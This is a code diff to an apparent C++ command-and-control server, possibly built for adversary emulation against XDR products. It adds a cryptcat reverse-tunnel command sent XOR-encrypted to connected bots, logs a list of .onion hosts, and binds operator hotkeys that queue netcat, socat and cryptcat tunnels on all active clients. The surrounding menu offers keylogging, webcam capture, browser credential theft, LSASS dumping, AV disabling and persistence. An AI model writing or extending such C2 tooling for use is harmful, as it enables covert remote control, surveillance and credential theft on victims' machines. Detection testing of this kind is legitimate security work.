@@ -178,7 +178,8 @@ std::atomic<bool> serverRunning(true);
         CMD_TOR_API_CALL = 0xA1,
         CMD_REVERSE_SSH = 0xA2,
         CMD_NETCAT_TUNNEL = 0xA3,
-        CMD_SOCAT_RELAY = 0xA4
+        CMD_SOCAT_RELAY = 0xA4,
+        CMD_CRYPTCAT_TUNNEL = 0xA5
     };
 
     // Global command queue for coordinated attacks
@@ -486,6 +487,7 @@ std::atomic<bool> serverRunning(true);
         case CMD_REVERSE_SSH: return "REVERSE_SSH_TUNNEL";
         case CMD_NETCAT_TUNNEL: return "NETCAT_TUNNEL_ESTABLISHED";
         case CMD_SOCAT_RELAY: return "SOCAT_RELAY_ACTIVATED";
+        case CMD_CRYPTCAT_TUNNEL: return "CRYPTCAT_TUNNEL_ESTABLISHED";
         default: return "UNKNOWN_COMMAND";
         }
     }
@@ -523,7 +525,7 @@ std::atomic<bool> serverRunning(true);
 
         case 3: // Defense Evasion
             phaseCommands = { CMD_DISABLE_AV, CMD_CLEAR_LOGS, CMD_AMSI_BYPASS, CMD_ETW_DISABLE, CMD_PROCESS_HOLLOW,
-                             CMD_TOR_CONNECT, CMD_TOR_API_CALL, CMD_REVERSE_SSH, CMD_NETCAT_TUNNEL, CMD_SOCAT_RELAY };
+                             CMD_TOR_CONNECT, CMD_TOR_API_CALL, CMD_REVERSE_SSH, CMD_NETCAT_TUNNEL, CMD_SOCAT_RELAY, CMD_CRYPTCAT_TUNNEL };
             phaseName = "DEFENSE_EVASION";
             phaseDescription = "Disabling security controls, clearing traces, and establishing covert channels";
             logActivity("DEFENSE_EVASION", phaseName, "=== PHASE 3: " + phaseDescription + " on " + clientId + " ===");
@@ -937,6 +939,31 @@ std::atomic<bool> serverRunning(true);
         }
         
         logActivity("*** CRITICAL ***", "NETCAT_SHELL", "Netcat reverse shell initiated from " + clientId);
+    }
+
+    // Cryptcat Tunnel
+    void executeCryptcatTunnel(SOCKET clientSocket, const std::string & clientId) {
+        logActivity("NETWORK", "CRYPTCAT_TUNNEL", "Creating cryptcat tunnel from " + clientId);
+
+        // Send primary command to trigger client execution
+        std::string ccCommand = "CRYPTCAT:TUNNEL:CREATE:EXECUTE\n";
+        send(clientSocket, xorEncrypt(ccCommand).c_str(), ccCommand.size(), 0);
+
+        // TOR hidden services (.onion domains)
+        std::vector<std::string> onionServices = {
+            "3g2upl4pq3kufc4m.onion:80",
+            "thehiddenwiki.onion:80",
+            "torc2server.onion:9050",
+            "darknetmarket.onion:443",
+            "fakec2trigger.onion:9999"
+        };
+
+        for (const auto& onion : onionServices) {
+            logActivity("*** XDR_ALERT ***", "CRYPTCAT_TOR", "Cryptcat connection expected to TOR service: " + onion);
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+
+        logActivity("*** CRITICAL ***", "CRYPTCAT_SHELL", "Cryptcat reverse shell initiated from " + clientId);
     }
     
     // Socat Relay
@@ -1578,6 +1605,7 @@ std::atomic<bool> serverRunning(true);
                                 else if (webCommand == "REVERSE_SSH") cmdType = CMD_REVERSE_SSH;
                                 else if (webCommand == "NETCAT_TUNNEL") cmdType = CMD_NETCAT_TUNNEL;
                                 else if (webCommand == "SOCAT_RELAY") cmdType = CMD_SOCAT_RELAY;
+                                else if (webCommand == "CRYPTCAT_TUNNEL") cmdType = CMD_CRYPTCAT_TUNNEL;
                                 
                                 commands.push_back(cmdType);
                                 logActivity("C2", "WEB_COMMAND", "Received " + webCommand + " from web dashboard for " + clientId);
@@ -1636,9 +1664,13 @@ std::atomic<bool> serverRunning(true);
                 case CMD_NETCAT_TUNNEL:
                     executeNetcatTunnel(clientSocket, clientId);
                     break;
-                    
+
                 case CMD_SOCAT_RELAY:
                     executeSocatRelay(clientSocket, clientId);
+                    break;
+
+                case CMD_CRYPTCAT_TUNNEL:
+                    executeCryptcatTunnel(clientSocket, clientId);
                     break;
 
                 case CMD_MICROPHONE_RECORD:
@@ -2681,6 +2713,7 @@ std::atomic<bool> serverRunning(true);
                 else if (webCommand == "REVERSE_SSH") cmdType = CMD_REVERSE_SSH;
                 else if (webCommand == "NETCAT_TUNNEL") cmdType = CMD_NETCAT_TUNNEL;
                 else if (webCommand == "SOCAT_RELAY") cmdType = CMD_SOCAT_RELAY;
+                else if (webCommand == "CRYPTCAT_TUNNEL") cmdType = CMD_CRYPTCAT_TUNNEL;
                 
                 // Execute command
                 std::lock_guard<std::mutex> lock(clientsMutex);
@@ -3093,7 +3126,7 @@ std::atomic<bool> serverRunning(true);
         std::cout << "|   1 - Phase 1: Recon            S - Screenshot           A - Disable AV    |\n";
         std::cout << "|   2 - Phase 2: Priv Esc         K - Start Keylogger      C - Clear Logs   |\n";
         std::cout << "|   3 - Phase 3: Defense Evade    D - Dump Keylogs         T - TOR Connect  |\n";
-        std::cout << "|   4 - Phase 4: Surveillance     W - Webcam Capture       N - SSH/Netcat   |\n";
+        std::cout << "|   4 - Phase 4: Surveillance     W - Webcam Capture       N - SSH/Netcat/Socat/Cryptcat   |\n";
         std::cout << "|   5 - Phase 5: Discovery        B - Browser Creds                         |\n";
         std::cout << "|                                                                            |\n";
         std::cout << "| EXPLOITATION:                  PERSISTENCE:             IMPACT:            |\n";
@@ -3278,10 +3311,10 @@ std::atomic<bool> serverRunning(true);
                 Sleep(200);
             }
             else if (GetAsyncKeyState('N') & 0x8000) {
-                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: N - Network Tunnels (SSH/Netcat/Socat)\033[0m\n";
+                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: N - Network Tunnels (SSH/Netcat/Socat/Cryptcat)\033[0m\n";
                 std::cout << "\033[31m[WARNING] This will create REAL network processes and connections!\033[0m\n";
                 logActivity("*** MANUAL ***", "N_PRESSED", "Network tunnels initiated by operator");
-                logActivity("C2", "COMMAND", "Creating network tunnels (SSH/Netcat/Socat) on all bots");
+                logActivity("C2", "COMMAND", "Creating network tunnels (SSH/Netcat/Socat/Cryptcat) on all bots");
                 
                 int targetCount = 0;
                 for (const auto& [id, client] : connectedClients) {
@@ -3289,10 +3322,30 @@ std::atomic<bool> serverRunning(true);
                         clientCommandQueue[id].push_back(CMD_REVERSE_SSH);
                         clientCommandQueue[id].push_back(CMD_NETCAT_TUNNEL);
                         clientCommandQueue[id].push_back(CMD_SOCAT_RELAY);
+                        clientCommandQueue[id].push_back(CMD_CRYPTCAT_TUNNEL);
                         targetCount++;
                     }
                 }
-                
+
+                std::cout << "\033[32m[+] 4 network commands queued for " << targetCount << " active client(s)\033[0m\n";
+                Sleep(200);
+            }
+            else if (GetAsyncKeyState('O') & 0x8000) {
+                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: O - TOR Netcat/Socat/Cryptcat\033[0m\n";
+                std::cout << "\033[31m[WARNING] This will create REAL network processes and connections!\033[0m\n";
+                logActivity("*** MANUAL ***", "O_PRESSED", "TOR netcat/socat/cryptcat initiated by operator");
+                logActivity("C2", "COMMAND", "Creating TOR netcat/socat/cryptcat connections on all bots");
+
+                int targetCount = 0;
+                for (const auto& [id, client] : connectedClients) {
+                    if (client.isActive) {
+                        clientCommandQueue[id].push_back(CMD_NETCAT_TUNNEL);
+                        clientCommandQueue[id].push_back(CMD_SOCAT_RELAY);
+                        clientCommandQueue[id].push_back(CMD_CRYPTCAT_TUNNEL);
+                        targetCount++;
+                    }
+                }
+
                 std::cout << "\033[32m[+] 3 network commands queued for " << targetCount << " active client(s)\033[0m\n";
                 Sleep(200);
             }
@@ -3369,7 +3422,8 @@ std::atomic<bool> serverRunning(true);
                 std::cout << "|   K - Start Keylogger                                                     |\n";
                 std::cout << "|   L - Lateral Movement (Port Scan + SMB)                                  |\n";
                 std::cout << "|   M - Mimikatz/LSASS Memory Dump                                          |\n";
-                std::cout << "|   N - Network Tunnels (SSH/Netcat/Socat) [REAL PROCESSES]                |\n";
+                std::cout << "|   N - Network Tunnels (SSH/Netcat/Socat/Cryptcat) [REAL PROCESSES]      |\n";
+                std::cout << "|   O - TOR Netcat/Socat/Cryptcat Connections [REAL PROCESSES]            |\n";
                 std::cout << "|   P - Install Persistence (Registry/Scheduled Task)                       |\n";
                 std::cout << "|   R - Deploy Ransomware Simulation                                        |\n";
                 std::cout << "|   S - Take Screenshot                                                     |\n";
